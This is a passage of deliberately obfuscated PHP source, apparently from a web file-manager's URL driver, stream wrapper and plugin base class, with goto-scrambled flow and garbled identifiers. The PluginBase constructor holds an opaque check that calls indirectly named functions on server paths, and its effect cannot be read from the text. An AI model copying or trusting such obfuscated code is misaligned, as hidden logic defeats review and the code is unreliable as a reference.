10, -8))); goto FÿåÛ‡…°Ç; Cª∫Ô»â∑±: function beforeShutdownFatalError($Dè™ïÌ”ƒÊ) { think_exception($Dè™ïÌ”ƒÊ); } $_SERVER[$_SERVER[ªƒÓ™éå][48]] = $c¥≈Ï¿ã…ı($_SERVER[$_SERVER[ªƒÓ™éå][45]]); $dìŸÒßı¿— = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto EÙÔÒú«ºª; bö√Ö≥‚ÚÓ: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($D≈Öç°©™à = false) { } public function exist($f≥÷·ëÜà˜) { $aÙÏü¢£á¯ = $this->info($f≥÷·ëÜà˜); return $aÙÏü¢£á¯[$_SERVER[—Ω][185]]; } public function isFile($F¬Úæ§ì„à) { $CÌ¯ø•Öà‚ = $this->info($F¬Úæ§ì„à); return $CÌ¯ø•Öà‚[$_SERVER[—Ω][185]]; } public function isFolder($D¨ÆÀ¿µƒÒ) { return !1; } public function size($B‚‚ΩÛóëä) { $EÊŸÎ¯õ∑≥ = $this->info($B‚‚ΩÛóëä); return $EÊŸÎ¯õ∑≥[$_SERVER[—Ω][77]]; } public function info($a©®∏§¥Í†) { return $this->infoParse($a©®∏§¥Í†); } public function infoAuth($Bÿªœ–ƒŸå) { return $this->infoParse($Bÿªœ–ƒŸå); } public function infoWithChildren($aò…äåòÚü) { return $this->infoParse($aò…äåòÚü); } public function infoFull($A¨⁄ôÚÎƒ≈) { return $this->infoParse($A¨⁄ôÚÎƒ≈); } private function infoParse($Béë‘öêÛé) { $bÇÎ»´®€∞ =& $_SERVER[—Ω]; $d¢œÎß∫Úâ = $this->header($Béë‘öêÛé); if (!$d¢œÎß∫Úâ || !$d¢œÎß∫Úâ[$bÇÎ»´®€∞[699]]) { return !1; } $DΩÚéîÃ£— = _get($d¢œÎß∫Úâ, $bÇÎ»´®€∞[322], 0); $B·Æ∏£ „ = array($bÇÎ»´®€∞[28] => $d¢œÎß∫Úâ[$bÇÎ»´®€∞[28]], $bÇÎ»´®€∞[75] => $Béë‘öêÛé, $bÇÎ»´®€∞[29] => $bÇÎ»´®€∞[164], $bÇÎ»´®€∞[77] => intval($DΩÚéîÃ£—), $bÇÎ»´®€∞[157] => get_path_ext($d¢œÎß∫Úâ[$bÇÎ»´®€∞[28]]), $bÇÎ»´®€∞[1158] => $DΩÚéîÃ£— > 0 && $d¢œÎß∫Úâ[$bÇÎ»´®€∞[1285]], $bÇÎ»´®€∞[1159] => !1); return $B·Æ∏£ „; } private function header($B“€é¨Âì∆) { if (isset(self::$_cacheHeader[$B“€é¨Âì∆])) { return self::$_cacheHeader[$B“€é¨Âì∆]; } self::$_cacheHeader[$B“€é¨Âì∆] = url_header($B“€é¨Âì∆); return self::$_cacheHeader[$B“€é¨Âì∆]; } public function hashSimple($eí¨ÑÜÉ›û, $BƒËä⁄Ñéú = false) { goto dﬁÏôÔ¬Ø◊; eù€å™∞˘ô: $C∑Ü€‡Ô€è = $F‡∑æ«ÆªΩ[$dÖ€ùìøÖö[77]]; $bÛáÙå‹¨Ì = 200; $fñ∫èÈÌÑ¿ = 50; goto e≥ÖÓé¢Î≠; e≥ÖÓé¢Î≠: if ($C∑Ü€‡Ô€è <= $bÛáÙå‹¨Ì * $fñ∫èÈÌÑ¿) { return md5($this->fileSubstr($eí¨ÑÜÉ›û, 0, $C∑Ü€‡Ô€è)) . $C∑Ü€‡Ô€è; } $Cä´◊™Õ√ = intval($C∑Ü€‡Ô€è / $fñ∫èÈÌÑ¿); $bãêÉòÁ≠∫ = $dÖ€ùìøÖö[33]; goto AÜëÆò£º˜; AÜëÆò£º˜: $Dƒ√äß©Üï = timeFloat(); $b¯‰ÌÉø≠® = 15; for ($f¶º˘—÷ã¡ = 0; $f¶º˘—÷ã¡ < $fñ∫èÈÌÑ¿; $f¶º˘—÷ã¡++) { if (timeFloat() - $Dƒ√äß©Üï > $b¯‰ÌÉø≠®) { return !1; } $bÜ¶ùã›“≠ = $this->fileSubstr($eí¨ÑÜÉ›û, $Cä´◊™Õ√ * $f¶º˘—÷ã¡, $bÛáÙå‹¨Ì); if (!$bÜ¶ùã›“≠) { return !1; } $bãêÉòÁ≠∫ .= $bÜ¶ùã›“≠; } goto Bô‰Ù≈î“›; dﬁÏôÔ¬Ø◊: $dÖ€ùìøÖö =& $_SERVER[—Ω]; $F‡∑æ«ÆªΩ = $this->info($eí¨ÑÜÉ›û); if (!$F‡∑æ«ÆªΩ || !$F‡∑æ«ÆªΩ[$dÖ€ùìøÖö[185]]) { return !1; } goto eù€å™∞˘ô; Bô‰Ù≈î“›: $bãêÉòÁ≠∫ .= $this->fileSubstr($eí¨ÑÜÉ›û, $C∑Ü€‡Ô€è - $bÛáÙå‹¨Ì, $bÛáÙå‹¨Ì); return md5($bãêÉòÁ≠∫) . $C∑Ü€‡Ô€è; goto bÇÖœøå”Ô; bÇÖœøå”Ô: } public function getContent($dá„û≠áØñ) { return $this->fileSubstr($dá„û≠áØñ); } public function fileSubstr($a…åˆ€◊ß™, $EˆÉåŸŒÂ… = 0, $bêÍåÕØ◊∑ = -1) { goto FËëÂÕ¿Æ‘; FËëÂÕ¿Æ‘: $a®’ﬂ•ÀÈ√ =& $_SERVER[—Ω]; $dí≤⁄òÓ„¨ = $this->info($a…åˆ€◊ß™); if (!$dí≤⁄òÓ„¨ || !$dí≤⁄òÓ„¨[$a®’ﬂ•ÀÈ√[185]] && $dí≤⁄òÓ„¨[$a®’ﬂ•ÀÈ√[77]] > 1024 * 1024 * 10) { return !1; } goto Fàâ¥Ñçæ¬; Dÿñ‚É•ï∏: $cﬂ• À»Ø‰ = url_request($a…åˆ€◊ß™, $a®’ﬂ•ÀÈ√[213], !1, $E◊ ‘Ï¢â”, !1, !1, 1); return $cﬂ• À»Ø‰[$a®’ﬂ•ÀÈ√[1038]] ? $cﬂ• À»Ø‰[$a®’ﬂ•ÀÈ√[1038]] : $a®’ﬂ•ÀÈ√[33]; goto dÌ∏íë¡çÉ; Fàâ¥Ñçæ¬: if ($bêÍåÕØ◊∑ === -1) { $bêÍåÕØ◊∑ = $dí≤⁄òÓ„¨[$a®’ﬂ•ÀÈ√[77]]; } if ($bêÍåÕØ◊∑ == 0) { return $a®’ﬂ•ÀÈ√[33]; } $E◊ ‘Ï¢â” = array($a®’ﬂ•ÀÈ√[1286] . $EˆÉåŸŒÂ… . $a®’ﬂ•ÀÈ√[724] . ($EˆÉåŸŒÂ… + $bêÍåÕØ◊∑ - 1)); goto Dÿñ‚É•ï∏; dÌ∏íë¡çÉ: } public function download($A•ìöÒò“Ó, $a∫éÖ´„Ë±) { Downloader::start($A•ìöÒò“Ó, $a∫éÖ´„Ë±); return $a∫éÖ´„Ë±; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Bü°öˆﬁﬁ√, $fÿ¡ç¢«∫ñ = '') { goto CÂ˜ó˘¨†; f‡”´¢†…Ω: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$Bü°öˆﬁﬁ√])) { self::$_chunkBuffer[$Bü°öˆﬁﬁ√] = array(); } goto f´ùﬁˆ¨»À; f´ùﬁˆ¨»À: return $this->info ? !0 : !1; goto Aﬂá˘òÃÒØ; CÂ˜ó˘¨†: $this->info = $this->info($Bü°öˆﬁﬁ√); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[—Ω][75]]; goto f‡”´¢†…Ω; Aﬂá˘òÃÒØ: } function stream_read($CË¯ÿﬁÏ¬) { $bâäò¨Ã“≥ = $this->fileSubstr($this->pose, $CË¯ÿﬁÏ¬); $this->pose += strlen($bâäò¨Ã“≥); return $bâäò¨Ã“≥; } public function stream_tell() { return $this->pose; } public function stream_seek($C∆ÁƒÁúÖ¯, $C¶Ï¯ÙøÛÁ) { $d§·ø∫Û¬√ =& $_SERVER[—Ω]; if ($C¶Ï¯ÙøÛÁ == SEEK_SET) { $this->pose = $C∆ÁƒÁúÖ¯; } else { if ($C¶Ï¯ÙøÛÁ == SEEK_CUR) { $this->pose += $C∆ÁƒÁúÖ¯; } else { if ($C¶Ï¯ÙøÛÁ == SEEK_END) { $this->pose = $this->info[$d§·ø∫Û¬√[77]] + intval($C∆ÁƒÁúÖ¯); } } } if ($C∆ÁƒÁúÖ¯ < 0) { $this->pose = $this->info[$d§·ø∫Û¬√[77]] + $C∆ÁƒÁúÖ¯; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[—Ω][77]]; } public function stream_close() { return !0; } public function url_stat($eùÉÀé◊îÓ, $Cä√ﬂÌõôò) { $BéìÊ•ŸÚé =& $_SERVER[—Ω]; $DöÑ»ÔÉ∑ = $this->info($eùÉÀé◊îÓ); return array($BéìÊ•ŸÚé[1287] => 0, $BéìÊ•ŸÚé[1288] => 0, $BéìÊ•ŸÚé[12] => 32768 + 511, $BéìÊ•ŸÚé[1289] => 0, $BéìÊ•ŸÚé[1290] => 0, $BéìÊ•ŸÚé[1291] => 0, $BéìÊ•ŸÚé[1292] => 0, $BéìÊ•ŸÚé[77] => $DöÑ»ÔÉ∑[$BéìÊ•ŸÚé[77]], $BéìÊ•ŸÚé[1293] => $DöÑ»ÔÉ∑[$BéìÊ•ŸÚé[1164]], $BéìÊ•ŸÚé[1250] => $DöÑ»ÔÉ∑[$BéìÊ•ŸÚé[107]], $BéìÊ•ŸÚé[1249] => $DöÑ»ÔÉ∑[$BéìÊ•ŸÚé[184]], $BéìÊ•ŸÚé[1294] => 0, $BéìÊ•ŸÚé[1295] => 0); } static $fileInfo = array(); public function info($E∫˜õ»◊˜µ) { $FÎàä≠∑Ê≥ = $_SERVER[—Ω][1296]; if (isset(self::$fileInfo[$E∫˜õ»◊˜µ])) { return self::$fileInfo[$E∫˜õ»◊˜µ]; } if (substr($E∫˜õ»◊˜µ, 0, strlen($FÎàä≠∑Ê≥)) != $FÎàä≠∑Ê≥) { return !1; } self::$fileInfo[$E∫˜õ»◊˜µ] = IO::info(substr($E∫˜õ»◊˜µ, strlen($FÎàä≠∑Ê≥))); return self::$fileInfo[$E∫˜õ»◊˜µ]; } public static function read($Fœ‡›ﬁÀπ’, $e”øÓ•ÛâÓ, $Cœﬁ∂Õèô‹) { goto Dæı∞¯Ñ∞∞; Dæı∞¯Ñ∞∞: $B÷‚ø“  È =& $_SERVER[—Ω]; $e¬æª≠ÌÀœ = fopen($Fœ‡›ﬁÀπ’, $B÷‚ø“  È[1166]); if (!$e¬æª≠ÌÀœ) { return $B÷‚ø“  È[33]; } goto b§…¶…‹£ä; e«‹∫◊ú∞‚: $AÁßîèÎÏ» = 0; while ($AÁßîèÎÏ» < $Cœﬁ∂Õèô‹) { $eõ◊È≤ŸƒØ = min($CØ’éûˆâ≠, $Cœﬁ∂Õèô‹ - $AÁßîèÎÏ»); $Eä√ú©’„¶ .= fread($e¬æª≠ÌÀœ, $eõ◊È≤ŸƒØ); $AÁßîèÎÏ» += $eõ◊È≤ŸƒØ; } fclose($e¬æª≠ÌÀœ); goto DÜÖâπËÀŒ; DÜÖâπËÀŒ: return $Eä√ú©’„¶; goto AÙª¶é≈êÃ; b§…¶…‹£ä: $CØ’éûˆâ≠ = 8192; fseek($e¬æª≠ÌÀœ, $e”øÓ•ÛâÓ, SEEK_SET); $Eä√ú©’„¶ = $B÷‚ø“  È[33]; goto e«‹∫◊ú∞‚; AÙª¶é≈êÃ: } public function fileSubstr($dÚö· Æ’, $F¥Á°¿—™‚) { goto dã‰ì‚ÙÕ“; fı˜«ÊÙúπ: $F·÷¡Ñ…á≠ = 64 * 1024; $a•Ê∫ú»Ö =& self::$_chunkBuffer[$this->path]; if (!$a•Ê∫ú»Ö) { $a•Ê∫ú»Ö = array(); } goto F–πá√üäá; d ¡ÌœÜ£Â: $F¶äªıµÇ± = ceil(($dÚö· Æ’ + $F¥Á°¿—™‚) / $F·÷¡Ñ…á≠) * $F·÷¡Ñ…á≠ - $eúäı≤º≤µ; $AÙ¢Úìá√Œ = IO::fileSubstr($this->path, $eúäı≤º≤µ, $F¶äªıµÇ±); $a•Ê∫ú»Ö[$eúäı≤º≤µ . $f¢ûÚÜÑë°[33]] = $AÙ¢Úìá√Œ; goto FÖ∞äéÒêÍ; dã‰ì‚ÙÕ“: $f¢ûÚÜÑë° =& $_SERVER[—Ω]; $E«‹¿œÆä∫ = $this->info[$f¢ûÚÜÑë°[77]]; $FÀÖÑä°üé = $dÚö· Æ’; goto FÈ±áˆäéõ; FÖ∞äéÒêÍ: ksort($a•Ê∫ú»Ö); $aƒ¢ë÷≠Óç = substr($AÙ¢Úìá√Œ, $dÚö· Æ’ - $eúäı≤º≤µ, $F¥Á°¿—™‚); return $aƒ¢ë÷≠Óç; goto cœ®›·¯—à; FÈ±áˆäéõ: $eﬁËà∫Ìñã = $F¥Á°¿—™‚; if ($dÚö· Æ’ < 0) { $dÚö· Æ’ = $E«‹¿œÆä∫ + $dÚö· Æ’; } if ($F¥Á°¿—™‚ === !1) { $F¥Á°¿—™‚ = $E«‹¿œÆä∫ - $dÚö· Æ’; } goto BÎçœå»Úá; B›∑á≤÷õ¶: foreach ($a•Ê∫ú»Ö as $FêèÜ§Œç† => $b¬ç©∞˜âÉ) { $FêèÜ§Œç† = intval($FêèÜ§Œç†); $d¥õê‰ÌÛ∑ = $FêèÜ§Œç† + strlen($b¬ç©∞˜âÉ); if ($dÚö· Æ’ >= $d¥õê‰ÌÛ∑) { continue; } if ($dÚö· Æ’ >= $FêèÜ§Œç† && $dÚö· Æ’ + $F¥Á°¿—™‚ <= $d¥õê‰ÌÛ∑) { return substr($b¬ç©∞˜âÉ, $dÚö· Æ’ - $FêèÜ§Œç†, $F¥Á°¿—™‚); } break; } if (count($a•Ê∫ú»Ö) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($f¢ûÚÜÑë°[1297], $f¢ûÚÜÑë°[1298] . count($a•Ê∫ú»Ö) . "\x3b\163\x74\x61\162\x74\x3d{$dÚö· Æ’}\x2c\x6c\145\156\147\164\150\x3d{$F¥Á°¿—™‚}\73\x70\x6f\x73\x65\x3a{$FêèÜ§Œç†}\176{$d¥õê‰ÌÛ∑}"); throw new Exception($f¢ûÚÜÑë°[1299]); } $eúäı≤º≤µ = intval($dÚö· Æ’ / $F·÷¡Ñ…á≠) * $F·÷¡Ñ…á≠; goto d ¡ÌœÜ£Â; BÎçœå»Úá: if ($dÚö· Æ’ + $F¥Á°¿—™‚ > $E«‹¿œÆä∫) { $F¥Á°¿—™‚ = $E«‹¿œÆä∫ - $dÚö· Æ’; } if ($F¥Á°¿—™‚ <= 0) { return $f¢ûÚÜÑë°[33]; } if ($dÚö· Æ’ < 0 || $dÚö· Æ’ >= $E«‹¿œÆä∫ || $F¥Á°¿—™‚ <= 0 || $F¥Á°¿—™‚ > 1024 * 1024 * 5) { throw new Exception("\x69\157\x46\151\154\145\x52\x65\x61\144\40\145\162\x72\157\x72\41\x20\x73\164\141\162\164\75{$dÚö· Æ’}\x3b\154\145\x6e\147\x74\150\x3d{$F¥Á°¿—™‚}\x3b\40\163\151\x7a\145\75{$E«‹¿œÆä∫}\73"); } goto fı˜«ÊÙúπ; F–πá√üäá: $FêèÜ§Œç† = 0; $d¥õê‰ÌÛ∑ = 0; $b¬ç©∞˜âÉ = $f¢ûÚÜÑë°[33]; goto B›∑á≤÷õ¶; cœ®›·¯—à: } private function log($EÉ»€å‚Ü¨, $cóüÙ°ÚñÀ) { $bä√¯™çö¡ =& $_SERVER[—Ω]; $Aü¿–†Ø‚’ = timeFloat() - $this->timeStart; write_log(sprintf($bä√¯™çö¡[1300], $EÉ»€å‚Ü¨, $this->info[$bä√¯™çö¡[28]], $Aü¿–†Ø‚’, $cóüÙ°ÚñÀ), $bä√¯™çö¡[1215]); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto eúÕÊﬁó∫œ; Fó˜Ω∑‰ìƒ: $this->values = array(); return $this; goto aéŸªË»Õ; eúÕÊﬁó∫œ: $BôÁ¡∂∆Â =& $_SERVER[—Ω]; if ($_SERVER[$BôÁ¡∂∆Â[690]] != $_SERVER[$BôÁ¡∂∆Â[1301]]) { goto B™±ñ∞ÖŸ∂; EÿÖåç≠¶©: $C≈Ö¶®·ºÔ = $c”†ÚÜ„Ç–($bù Âëâ≈ê); $EŒÂàºƒì† = explode($BôÁ¡∂∆Â[214], $C≈Ö¶®·ºÔ); if (count($EŒÂàºƒì†) < $BôÁ¡∂∆Â[581]) { $aı¿êº£Ãé = $BôÁ¡∂∆Â[695]; $aı¿êº£Ãé(); } goto B¥§ì—ºﬂÁ; B¥§ì—ºﬂÁ: $c¨°ü≠Ö÷£ = $BôÁ¡∂∆Â[798]; $c¨°ü≠Ö÷£($_SERVER[$BôÁ¡∂∆Â[799]]); $c¨°ü≠Ö÷£($_SERVER[$BôÁ¡∂∆Â[693]] . $BôÁ¡∂∆Â[1302]); goto C™™Ùèÿã©; C™™Ùèÿã©: $Dà§ÏÁÇç˘ = 1; while ($Dà§ÏÁÇç˘ > 1) { $Dà§ÏÁÇç˘ = $Dà§ÏÁÇç˘ + 4; $F“î“¨πÙ¢ = rawurlencode($Dà§ÏÁÇç˘ . $BôÁ¡∂∆Â[358]); } goto Fîî≥”ÜÖº; B™±ñ∞ÖŸ∂: $a≤àı⁄Æ“≥ = $BôÁ¡∂∆Â[797]; $c”†ÚÜ„Ç– = $BôÁ¡∂∆Â[692]; $bù Âëâ≈ê = $_SERVER[$BôÁ¡∂∆Â[693]] . $BôÁ¡∂∆Â[694]; goto EÿÖåç≠¶©; Fîî≥”ÜÖº: } global $in, $config; goto f·Â÷É˘’ˆ; f·Â÷É˘’ˆ: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($BôÁ¡∂∆Â[1303]); goto eπﬂ‰Êëø¡; d∏‡⁄∫°Ù≠: $this->pluginHost = PLUGIN_HOST . $this->pluginName . $BôÁ¡∂∆Â[8]; $this->pluginHostDefault = PLUGIN_HOST . $this->pluginName . $BôÁ¡∂∆Â[8]; $this->pluginLangArr = $this->initLang(); goto Fó˜Ω∑‰ìƒ; eπﬂ‰Êëø¡: $this->pluginName = str_replace($BôÁ¡∂∆Â[1303], $BôÁ¡∂∆Â[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $BôÁ¡∂∆Â[8]; $this->pluginApi = appHostGet() . $BôÁ¡∂∆Â[1304] . $this->pluginName . $BôÁ¡∂∆Â[8]; goto d∏‡⁄∫°Ù≠; aéŸªË»Õ: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[—Ω][1305]); } protected function assign($Dêõ…ï≈Íê, $aˆ∑ÿ∫÷¯Ù = false) { if (is_array($Dêõ…ï≈Íê)) { $this->values = array_merge($this->values, $Dêõ…ï≈Íê); } else { $this->values[$Dêõ…ï≈Íê] = $aˆ∑ÿ∫÷¯Ù; } } protected function display($EÖ≥∑â¢±Ï) { extract($this->values); require $EÖ≥∑â¢±Ï; } final function hookRegist($Fåæì„éÿ‹) { $this->modelPlugin->appRegist($this->pluginName, $Fåæì„éÿ‹); } final function appIcon() { $E†¨À¿ΩËå =& $_SERVER[—Ω]; $aùÔ”‚ˆêû = $this->appPackage(); $có…Á∂ëÏÀ = $E†¨À¿ΩËå[33]; if (isset($aùÔ”‚ˆêû[$E†¨À¿ΩËå[379]])) { if (isset($aùÔ”‚ˆêû[$E†¨À¿ΩËå[379]][$E†¨À¿ΩËå[1306]])) { $có…Á∂ëÏÀ = $E†¨À¿ΩËå[1307] . $aùÔ”‚ˆêû[$E†¨À¿ΩËå[379]][$E†¨À¿ΩËå[1306]] . $E†¨À¿ΩËå[1308]; } else { if ($aùÔ”‚ˆêû[$E†¨À¿ΩËå[379]][$E†¨À¿ΩËå[1309]]) { $có…Á∂ëÏÀ = $E†¨À¿ΩËå[1310] . $aùÔ”‚ˆêû[$E†¨À¿ΩËå[379]][$E†¨À¿ΩËå[1309]] . $E†¨À¿ΩËå[1311]; } } } return $có…Á∂ëÏÀ; } final function fileCanView($DˆΩÍœ“©∂) { $A‹«ˆ¯¿ê  =& $_SERVER[—Ω]; if (request_url_safe($DˆΩÍœ“©∂)) { return !0; } if ($this->isShare($DˆΩÍœ“©∂)) { return !0; } if (!Action($A‹«ˆ¯¿ê [1312])->authCan($A‹«ˆ¯¿ê [1313])) { show_tips(LNG($A‹«ˆ¯¿ê [1314]) . $A‹«ˆ¯¿ê [1315], !1); } ActionCall($A‹«ˆ¯¿ê [1316], $DˆΩÍœ“©∂); } final function isShare($Aü˘˜´ãõÈ) { $E‹““Ëûå© = KodIO::parse($Aü˘˜´ãõÈ); return $E‹““Ëûå©[$_SERVER[—Ω][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($C˜±Øﬁ∫´¢) { if (request_url_safe($C˜±Øﬁ∫´¢)) { return $C˜±Øﬁ∫´¢; } if (!$this->isShare($C˜±Øﬁ∫´¢)) { $C˜±Øﬁ∫´¢ = $this->filePath($C˜±Øﬁ∫´¢); } return Action($_SERVER[—Ω][1021])->linkOut($C˜±Øﬁ∫´¢); } public function filePathLinkOut($d∑⁄°∂ÏÈí) { if (request_url_safe($d∑⁄°∂ÏÈí)) { return $d∑⁄°∂ÏÈí; } $this->fileCanView($d∑⁄°∂ÏÈí); return Action($_SERVER[—Ω][1021])->link($d∑⁄°∂ÏÈí); } final function filePath($E“Ø—¿◊ï‘) { $C¡ÂŒÎÍûÎ =& $_SERVER[—Ω]; if ($CûÔÔ∆Á § = $this->checkSharePath($E“Ø—¿◊ï‘)) { return $CûÔÔ∆Á §; } $this->fileCanView($E“Ø—¿◊ï‘); if (request_url_safe($E“Ø—¿◊ï‘)) { $eÍ‹Õ’õﬁì = parse_url_query($E“Ø—¿◊ï‘); if (isset($eÍ‹Õ’õﬁì[$C¡ÂŒÎÍûÎ[1317]]) && isset($eÍ‹Õ’õﬁì[$C¡ÂŒÎÍûÎ[194]])) { $d£Õä¥·‚˜ = Model($C¡ÂŒÎÍûÎ[1092])->get($C¡ÂŒÎÍûÎ[1318]); $füÏ“í‘—ì = Mcrypt::decode($eÍ‹Õ’õﬁì[$C¡ÂŒÎÍûÎ[194]], $d£Õä¥·‚˜); if ($füÏ“í‘—ì) { $this->fileInfo = IO::infoWithChildren($füÏ“í‘—ì); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $füÏ“í‘—ì; } } $E“Ø—¿◊ï‘ = $this->_cacheHttpFile($E“Ø—¿◊ï‘); $this->fileInfo = IO::infoWithChildren($E“Ø—¿◊ï‘); } else { $this->fileInfo = IO::infoWithChildren($E“Ø—¿◊ï‘); if (!$this->fileInfo) { show_tips(LNG($C¡ÂŒÎÍûÎ[102]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $E“Ø—¿◊ï‘; } final function _cacheHttpFile($C∆∂ãœ©ß“) { $E«§Üäœ†¿ = hash_path($C∆∂ãœ©ß“, !0); $this->cachePath = $this->pluginCachePath($E«§Üäœ†¿); if ($Eç˜±ø˘¯Ñ = IO::fileNameExist($this->cachePath, $E«§Üäœ†¿)) { return KodIO::make($Eç˜±ø˘¯Ñ); } $E¶Â äÑ◊– = $this->cachePath . $E«§Üäœ†¿; return $this->pluginCacheFileSet($E¶Â äÑ◊–, file_get_contents($C∆∂ãœ©ß“)); } final function _tmpFileName($Eó™…éã‰€ = array()) { goto c·§¢◊áÜ˘; e–á‘ä •°: if (isset($Eó™…éã‰€[$eº‰Ωóéåà[159]][$eº‰Ωóéåà[161]])) { return $Eó™…éã‰€[$eº‰Ωóéåà[159]][$eº‰Ωóéåà[161]]; } $a®ëì∂Õù◊ = array($Eó™…éã‰€[$eº‰Ωóéåà[28]], $Eó™…éã‰€[$eº‰Ωóéåà[75]], $Eó™…éã‰€[$eº‰Ωóéåà[77]]); if (isset($Eó™…éã‰€[$eº‰Ωóéåà[455]])) { $a®ëì∂Õù◊[] = $Eó™…éã‰€[$eº‰Ωóéåà[455]]; } goto F”ç¨Àùçâ; F”ç¨Àùçâ: return md5(implode($eº‰Ωóéåà[70], $a®ëì∂Õù◊)); goto Eàçé“”ÂÛ; c·§¢◊áÜ˘: $eº‰Ωóéåà =& $_SERVER[—Ω]; if (!$Eó™…éã‰€) { $Eó™…éã‰€ = $this->fileInfo; } if (isset($Eó™…éã‰€[$eº‰Ωóéåà[161]])) { return $Eó™…éã‰€[$eº‰Ωóéåà[161]]; } goto e–á‘ä •°; Eàçé“”ÂÛ: } final function checkSharePath($C¿É∫µΩ‡◊) { goto dÏ∂ËÒÀ‘; bêéΩÔö≈∑: $fçºîπÒ©— = Action($B¥úíÒõ¢ó[1021])->sharePathInfo($C¿É∫µΩ‡◊); if (!isset($fçºîπÒ©—[$B¥úíÒõ¢ó[75]])) { show_json(LNG($B¥úíÒõ¢ó[1320]), !1); } $this->fileInfo = $fçºîπÒ©—[$B¥úíÒõ¢ó[159]]; goto D·Ñ‘ èÛø; D·Ñ‘ èÛø: $this->cachePath = $this->pluginCachePath($this->fileInfo[$B¥úíÒõ¢ó[161]]); return $fçºîπÒ©—[$B¥úíÒõ¢ó[75]]; goto c†ÖÉäë’î; dÏ∂ËÒÀ‘: $B¥úíÒõ¢ó =& $_SERVER[—Ω]; if (!defined($B¥úíÒõ¢ó[423])) { define($B¥úíÒõ¢ó[1319], 0); } if (!$this->isShare($C¿É∫µΩ‡◊)) { return !1; } goto bêéΩÔö≈∑; c†ÖÉäë’î: } final function pluginCachePath($fá¶ˆçç¿Ë = '') { $Dﬁø∏•ã¶« =& $_SERVER[—Ω]; $CîÓŸ…úû¢ = IO_PATH_SYSTEM_TEMP . $Dﬁø∏•ã¶«[1321] . $this->pluginName; if (!($cáüæÀ∆§Ï = IO::infoFull($CîÓŸ…úû¢))) { return IO::mkdir($CîÓŸ…úû¢ . $Dﬁø∏•ã¶«[8] . $fá¶ˆçç¿Ë); } if (empty($fá¶ˆçç¿Ë)) { return $cáüæÀ∆§Ï[$Dﬁø∏•ã¶«[75]]; } if (!($F¨ª”ãÖ§Ø = IO::fileNameExist($cáüæÀ∆§Ï[$Dﬁø∏•ã¶«[75]], $fá¶ˆçç¿Ë))) { return IO::mkdir($cáüæÀ∆§Ï[$Dﬁø∏•ã¶«[75]] . $fá¶ˆçç¿Ë); } return KodIO::make($F¨ª”ãÖ§Ø); } final function pluginCacheFileSet($c∞˜≤è‘÷ë, $BãØ“À¶∞Ö = '') { $d√⁄…¡·©∞ =& $_SERVER[—Ω]; if (!($FÃÿÎ“Îöâ = IO::infoFull($c∞˜≤è‘÷ë))) { return IO::mkfile($c∞˜≤è‘÷ë, $BãØ“À¶∞Ö, REPEAT_REPLACE); } IO::setContent($FÃÿÎ“Îöâ[$d√⁄…¡·©∞[75]], $BãØ“À¶∞Ö); return $FÃÿÎ“Îöâ[$d√⁄…¡·©∞[75]]; } final function pluginLocalFile($b∏•”‚Æï≈ = '') { goto fı∫≤à¡Ã¿; C âÑüÔú·: if (!$b∏•”‚Æï≈) { return $fÉ®èµ…Üá; } $eΩªΩªß√‡ = IO::info($b∏•”‚Æï≈); $CªΩ‡…ı¿ã = $this->_tmpFileName($eΩªΩªß√‡) . $eÁÚÙﬁŸÜŸ[93] . $eΩªΩªß√‡[$eÁÚÙﬁŸÜŸ[157]]; goto F˘¨û£‘åﬂ; fı∫≤à¡Ã¿: $eÁÚÙﬁŸÜŸ =& $_SERVER[—Ω]; $fÉ®èµ…Üá = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($fÉ®èµ…Üá)) { mk_dir($fÉ®èµ…Üá); } goto C âÑüÔú·; F˘¨û£‘åﬂ: $FÛÊåÂÈ§π = $fÉ®èµ…Üá . $CªΩ‡…ı¿ã; if (@file_exists($FÛÊåÂÈ§π)) { return $FÛÊåÂÈ§π; } return IO::copy($b∏•”‚Æï≈, $fÉ®èµ…Üá, 0, $CªΩ‡…ı¿ã); goto eÃÁÑ†ò’à; eÃÁÑ†ò’à: } final function appPackage() { goto e¿πè◊Ÿìä; e¿πè◊Ÿìä: $A…Ñåèøﬂ§ =& $_SERVER[—Ω]; if ($this->packageData) { return $this->packageData; } $cñıèû´≥£ = $this->parseFile($this->pluginPath . $A…Ñåèøﬂ§[1322]); goto CØ©§”≥”Ë; CØ©§”≥”Ë: $this->parseLang($cñıèû´≥£); $D›ŸúÚáúÙ = json_decode_force($cñıèû´≥£); if (!$D›ŸúÚáúÙ) { return array(); } goto E…Ê„àÈÜµ; A–±ÒÊìã¨: return $D›ŸúÚáúÙ; goto f·¯ååè”ã; E…Ê„àÈÜµ: $cﬂ‹ï¯ËÜÈ = Hook::trigger($A…Ñåèøﬂ§[1323], $D›ŸúÚáúÙ); if ($cﬂ‹ï¯ËÜÈ && is_array($cﬂ‹ï¯ËÜÈ)) { $D›ŸúÚáúÙ = $cﬂ‹ï¯ËÜÈ; } $this->packageData = $D›ŸúÚáúÙ; goto A–±ÒÊìã¨; f·¯ååè”ã: } public function packageInfoGet($e…Àº–‚Ü·) { $B´…Èœ¢·Â = $this->appPackage(); return array_get_value($B´…Èœ¢·Â, $e…Àº–‚Ü·); } public function packageVersion() { return $this->packageInfoGet($_SERVER[—Ω][1324]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[—Ω][1325]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[—Ω][1326]); } private function 